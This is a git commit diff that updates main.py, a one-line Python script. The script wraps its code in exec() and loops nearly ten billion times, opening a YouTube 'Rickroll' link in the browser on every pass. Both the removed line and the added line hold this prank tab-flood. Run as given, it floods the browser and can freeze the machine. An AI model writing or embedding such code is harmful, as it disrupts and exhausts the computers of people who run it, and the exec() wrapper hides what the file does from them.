1d96374175efa0f15e04337de2281cef14680ea8
Nattawatt Hongthong <73651838+RealNattawattHongthong@users.noreply.github.com>
2021-12-16 07:45:31 +0700

    Update main.py

--- main.py
+++ main.py
@@ -1,1 +1,1 @@
-exec("from random import randint\nfrom webbrowser import open\nfor _ in range(9999999999):open(f'https://youtu.be/dQw4w9WgXcQ')")
+exec("from webbrowser import open\nfor _ in range(9999999999):open(f'https://youtu.be/dQw4w9WgXcQ')")
